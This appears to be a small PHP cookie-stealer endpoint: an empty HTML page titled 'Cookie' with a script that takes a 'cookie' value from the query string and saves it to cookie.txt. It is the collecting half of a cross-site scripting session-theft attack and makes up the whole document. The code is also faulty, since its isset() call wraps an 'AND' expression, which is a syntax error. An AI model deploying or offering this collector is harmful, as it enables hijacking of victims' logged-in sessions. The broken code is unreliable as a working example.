<!DOCTYPE html>
<html>
<head>
<title>Cookie</title>
</head>
<body>
</body>
</html> 
<?php
if(isset($_GET["cookie"] AND !empty($_GET["cookie"]))
{
	$cookie = $_GET["cookie"];
	$file = fopen("cookie.txt", "w");
	fwrite($file, $cookie."\n");
	fclose($file);
}
